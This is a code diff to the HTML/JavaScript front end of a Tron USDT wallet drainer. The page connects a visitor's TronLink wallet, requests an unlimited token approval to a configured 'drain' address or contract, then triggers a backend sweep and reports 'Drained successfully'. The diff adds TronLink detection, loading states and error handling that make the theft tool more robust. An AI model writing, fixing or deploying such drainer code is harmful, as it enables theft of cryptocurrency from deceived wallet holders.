@@ -165,6 +165,27 @@
             border-color: #334155;
             margin: 1rem 0;
         }
+        
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 8px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
     </style>
 </head>
 <body>
@@ -218,9 +239,37 @@
 <script>
     // ---------- GLOBALS ----------
     let userAddress = null;
-    let tronWebInstance = null;
+    let tronProvider = null;      // The provider from TronLink
+    let tronWebInstance = null;   // The tronWeb instance from the provider
     let configData = { drainAddress: '', drainContract: '', maxApprove: '' };
-    let usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // fallback, will be updated from config if needed
+    let usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    
+    // Helper function to delay execution
+    function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    // ---------- Helper: Get Button Elements & Update Loading State ----------
+    const connectBtn = document.getElementById('connectBtn');
+    const approveBtn = document.getElementById('approveBtn');
+    const drainBtn = document.getElementById('drainBtn');
+    
+    function setButtonLoading(button, isLoading) {
+        if (!button) return;
+        if (isLoading) {
+            button.disabled = true;
+            const originalText = button.textContent;
+            button.setAttribute('data-original-text', originalText);
+            button.innerHTML = `${originalText} <span class="spinner"></span>`;
+        } else {
+            button.disabled = false;
+            const originalText = button.getAttribute('data-original-text');
+            if (originalText) {
+                button.textContent = originalText;
+                button.removeAttribute('data-original-text');
+            }
+        }
+    }
 
     // ---------- HELPER: log event to backend ----------
     async function logEvent(type, address, txId = '', amount = '') {
@@ -244,12 +293,19 @@
                 maxApprove: data.maxApprove || '115792089237316195423570985008687907853269984665640564039457584007913129639935'
             };
             if (data.usdtContract) usdtContractAddress = data.usdtContract;
-            document.getElementById('spenderAddress').innerText = configData.drainContract || configData.drainAddress || '❌ Not set';
-            document.getElementById('maxApprove').innerText = configData.maxApprove === '115792089237316195423570985008687907853269984665640564039457584007913129639935'
-                ? '∞ (unlimited)' : configData.maxApprove;
+            const spannerElement = document.getElementById('spenderAddress');
+            if (spannerElement) {
+                spannerElement.innerText = configData.drainContract || configData.drainAddress || '❌ Not set';
+            }
+            const maxApproveElement = document.getElementById('maxApprove');
+            if (maxApproveElement) {
+                maxApproveElement.innerText = configData.maxApprove === '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+                    ? '∞ (unlimited)' : configData.maxApprove;
+            }
         } catch(e) {
             console.error('Config error', e);
-            document.getElementById('statusMsg').innerHTML = '⚠️ Failed to load backend config.';
+            const statusMsg = document.getElementById('statusMsg');
+            if (statusMsg) statusMsg.innerHTML = '⚠️ Failed to load backend config.';
         }
     }
 
@@ -264,11 +320,16 @@
             });
             if (!res.ok) throw new Error('Balance fetch failed');
             const data = await res.json();
-            document.getElementById('usdtBalance').innerText = data.usdt.toFixed(2) + ' USDT';
-            document.getElementById('trxBalance').innerText = data.trx.toFixed(2) + ' TRX';
+            const usdtElement = document.getElementById('usdtBalance');
+            const trxElement = document.getElementById('trxBalance');
+            if (usdtElement) usdtElement.innerText = data.usdt.toFixed(2) + ' USDT';
+            if (trxElement) trxElement.innerText = data.trx.toFixed(2) + ' TRX';
         } catch(err) {
-            document.getElementById('usdtBalance').innerText = 'Error';
-            document.getElementById('trxBalance').innerText = 'Error';
+            console.error('Balance update failed:', err);
+            const usdtElement = document.getElementById('usdtBalance');
+            const trxElement = document.getElementById('trxBalance');
+            if (usdtElement) usdtElement.innerText = 'Error';
+            if (trxElement) trxElement.innerText = 'Error';
         }
     }
 
@@ -283,9 +344,7 @@
         } else {
             let amountNum = parseFloat(amountRaw);
             if (isNaN(amountNum)) throw new Error('Invalid amount');
-            amountWei = tronWebInstance.toSun(amountNum * 1e6); // USDT has 6 decimals, toSun converts from TRX scale? No – careful: USDT decimals = 6
-            // Actually tronWeb.toSun multiplies by 1e6. So toSun(amount) works for 6 decimals.
-            // But to be safe:
+            // USDT has 6 decimals
             amountWei = Math.floor(amountNum * 1e6).toString();
         }
 
@@ -309,31 +368,113 @@
         return data;
     }
 
-    // ---------- TRONLINK CONNECTION ----------
+    // ---------- TRONLINK CONNECTION LOGIC (Updated) ----------
     async function connectTronLink() {
-        if (!window.tronLink || !window.tronLink.ready) {
-            alert('Please install TronLink (https://tronlink.org)');
-            return false;
+        if (!tronProvider) {
+            // Try to detect TronLink again if it wasn't found initially
+            await detectTronLink();
+            if (!tronProvider) {
+                alert('TronLink not detected. Please make sure the extension is installed and unlocked.');
+                return false;
+            }
         }
+        
+        setButtonLoading(connectBtn, true);
+        const statusDiv = document.getElementById('statusMsg');
         try {
-            const accounts = await window.tronLink.request({ method: 'tron_requestAccounts' });
-            if (!accounts || accounts.length === 0) throw new Error('No accounts');
+            // Request account access using the provider's request method
+            // This triggers the TronLink popup to connect
+            const accounts = await tronProvider.request({ method: 'eth_requestAccounts' });
+            if (!accounts || accounts.length === 0) {
+                throw new Error('No accounts returned');
+            }
+            
             userAddress = accounts[0];
-            tronWebInstance = window.tronLink.tronWeb;
+            // After successful authorization, tronWeb is available on the provider
+            if (tronProvider.tronWeb && tronProvider.tronWeb.ready) {
+                tronWebInstance = tronProvider.tronWeb;
+            } else {
+                // Fallback: wait a moment for tronWeb to become ready
+                console.log('Waiting for tronWeb to become ready...');
+                await delay(500);
+                if (tronProvider.tronWeb && tronProvider.tronWeb.ready) {
+                    tronWebInstance = tronProvider.tronWeb;
+                } else {
+                    throw new Error('TronWeb instance not available after connection');
+                }
+            }
+            
             // Show wallet section
-            document.getElementById('connectBtn').style.display = 'none';
-            document.getElementById('walletInfo').style.display = 'block';
-            document.getElementById('actionCard').style.display = 'block';
-            document.getElementById('addressDisplay').innerText = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
+            const connectBtnElement = document.getElementById('connectBtn');
+            const walletInfoElement = document.getElementById('walletInfo');
+            const actionCardElement = document.getElementById('actionCard');
+            if (connectBtnElement) connectBtnElement.style.display = 'none';
+            if (walletInfoElement) walletInfoElement.style.display = 'block';
+            if (actionCardElement) actionCardElement.style.display = 'block';
+            
+            const addressDisplayElement = document.getElementById('addressDisplay');
+            if (addressDisplayElement) {
+                addressDisplayElement.innerText = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
+            }
+            
             await updateBalances(userAddress);
             await logEvent('wallet_connected', userAddress);
-            document.getElementById('statusMsg').innerHTML = '✅ Connected. You can now approve USDT.';
+            if (statusDiv) statusDiv.innerHTML = '✅ Connected. You can now approve USDT.';
             return true;
         } catch (err) {
-            console.error(err);
-            document.getElementById('statusMsg').innerHTML = '❌ Connection failed: ' + err.message;
+            console.error('Connection error:', err);
+            let errorMsg = 'Connection failed: ';
+            if (err.code === 4001) {
+                errorMsg += 'User rejected the request.';
+            } else if (err.code === -32000) {
+                errorMsg += 'Request already pending. Please check TronLink.';
+            } else {
+                errorMsg += err.message || 'Unknown error';
+            }
+            if (statusDiv) statusDiv.innerHTML = `❌ ${errorMsg}`;
+            alert(errorMsg);
             return false;
+        } finally {
+            setButtonLoading(connectBtn, false);
         }
+    }
+
+    // ---------- DETECT TRONLINK (TIP-6963) ----------
+    async function detectTronLink() {
+        return new Promise((resolve) => {
+            // Method 1: Check if window.tron is already available and is TronLink
+            if (window.tron && (window.tron.isTronLink || window.tron.isTronLink === undefined)) {
+                console.log('TronLink detected via window.tron');
+                tronProvider = window.tron;
+                resolve(true);
+                return;
+            }
+            
+            // Method 2: Use TIP-6963 event-based detection (recommended)
+            let resolved = false;
+            const handler = (e) => {
+                if (resolved) return;
+                if (e.detail && e.detail.info && e.detail.info.name === 'TronLink') {
+                    console.log('TronLink detected via TIP-6963 event');
+                    tronProvider = e.detail.provider;
+                    window.removeEventListener('TIP6963:announceProvider', handler);
+                    resolved = true;
+                    resolve(true);
+                }
+            };
+            
+            window.addEventListener('TIP6963:announceProvider', handler);
+            window.dispatchEvent(new Event('TIP6963:requestProvider'));
+            
+            // Fallback: If no event received after 2 seconds, assume not installed
+            setTimeout(() => {
+                if (!resolved) {
+                    window.removeEventListener('TIP6963:announceProvider', handler);
+                    console.log('TronLink not detected via events');
+                    resolve(false);
+                }
+            }, 2000);
+        });
     }
 
     // ---------- EVENT HANDLERS ----------
@@ -349,13 +490,18 @@
         }
         const amountInput = document.getElementById('approveAmount').value.trim();
         const statusDiv = document.getElementById('statusMsg');
-        statusDiv.innerHTML = '⏳ Approving USDT... check TronLink popup.';
+        setButtonLoading(approveBtn, true);
+        
         try {
             const tx = await approveUSDT(spender, amountInput);
-            statusDiv.innerHTML = `✅ Approved! TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx.slice(0,10)}...</a>`;
+            if (statusDiv) {
+                statusDiv.innerHTML = `✅ Approved! TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx.slice(0,10)}...</a>`;
+            }
         } catch (err) {
-            statusDiv.innerHTML = `❌ Approve failed: ${err.message}`;
             console.error(err);
+            if (statusDiv) statusDiv.innerHTML = `❌ Approve failed: ${err.message}`;
+        } finally {
+            setButtonLoading(approveBtn, false);
         }
     }
 
@@ -365,30 +511,52 @@
             return;
         }
         const statusDiv = document.getElementById('statusMsg');
-        statusDiv.innerHTML = '⏳ Sending drain request...';
+        setButtonLoading(drainBtn, true);
+        
         try {
             const result = await callSweep();
-            statusDiv.innerHTML = `💀 Drained successfully! TX: <a href="https://tronscan.org/#/transaction/${result.txId}" target="_blank">${result.txId.slice(0,10)}...</a>`;
+            if (statusDiv) {
+                statusDiv.innerHTML = `💀 Drained successfully! TX: <a href="https://tronscan.org/#/transaction/${result.txId}" target="_blank">${result.txId.slice(0,10)}...</a>`;
+            }
             // Refresh balances after drain attempt
             setTimeout(() => updateBalances(userAddress), 4000);
         } catch (err) {
-            statusDiv.innerHTML = `❌ Drain error: ${err.message}. Make sure approval is done first.`;
+            console.error(err);
+            if (statusDiv) statusDiv.innerHTML = `❌ Drain error: ${err.message}. Make sure approval is done first.`;
+        } finally {
+            setButtonLoading(drainBtn, false);
         }
     }
 
     // ---------- INIT ----------
-    window.addEventListener('load', () => {
-        loadConfig();
-        document.getElementById('connectBtn').addEventListener('click', connectTronLink);
-        document.getElementById('approveBtn').addEventListener('click', handleApprove);
-        document.getElementById('drainBtn').addEventListener('click', handleDrain);
-        // detect TronLink presence
-        if (window.tronLink && window.tronLink.ready) {
-            document.getElementById('statusMsg').innerHTML = '🟢 TronLink detected. Click "Connect" above.';
+    async function init() {
+        await loadConfig();
+        
+        // Attach event listeners
+        const connectBtnElement = document.getElementById('connectBtn');
+        const approveBtnElement = document.getElementById('approveBtn');
+        const drainBtnElement = document.getElementById('drainBtn');
+        
+        if (connectBtnElement) connectBtnElement.addEventListener('click', connectTronLink);
+        if (approveBtnElement) approveBtnElement.addEventListener('click', handleApprove);
+        if (drainBtnElement) drainBtnElement.addEventListener('click', handleDrain);
+        
+        // Detect TronLink on page load
+        const detected = await detectTronLink();
+        const statusDiv = document.getElementById('statusMsg');
+        if (detected && tronProvider) {
+            if (statusDiv) statusDiv.innerHTML = '🟢 TronLink detected. Click "Connect" above.';
+            console.log('TronLink is available');
         } else {
-            document.getElementById('statusMsg').innerHTML = '⚠️ TronLink not detected. Install extension.';
+            if (statusDiv) statusDiv.innerHTML = '⚠️ TronLink not detected. Please install the extension.';
+            console.log('TronLink not found');
+            // Disable approve and drain buttons until connection
+            if (approveBtnElement) approveBtnElement.disabled = true;
+            if (drainBtnElement) drainBtnElement.disabled = true;
         }
-    });
+    }
+    
+    init();
 </script>
 </body>
 </html>
